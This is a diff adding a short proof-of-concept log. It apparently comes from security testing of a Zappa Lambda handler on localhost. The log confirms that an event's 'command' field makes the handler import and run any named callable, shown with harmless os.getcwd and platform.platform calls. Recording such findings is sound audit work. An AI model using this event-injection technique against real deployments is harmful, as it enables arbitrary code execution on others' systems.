@@ -1,0 +1,12 @@
+==========================================================================
+VULN-002: command event field -> import + call arbitrary callable
+target : http://localhost:22571
+[INFO] exercising: zappa/handler.py:906-912 -> utilities.py:146-153 import_and_get_function
+==========================================================================
+[STEP] sending {"command": "os.getcwd"} — attacker names the callable to run
+[INFO] handler returned os.getcwd() = '/app/_harness'
+[STEP] sending {"command": "platform.platform"} — a different module entirely
+[INFO] handler returned platform.platform() = 'Linux-7.0.0-34-generic-x86_64-with-glibc2.41'
+[PROOF] two unrelated modules (os, platform) were imported and invoked purely from the event's `command` field, returning live results ('/app/_harness', 'Linux-7.0.0-34-generic-x86_64-with-glibc2.41') — the event chooses which code runs in the Lambda.
+[OK] exploit confirmed — arbitrary callable imported and executed from the event
+==> VULN-002: CONFIRMED — event `command` -> arbitrary import+invoke (Surface B)
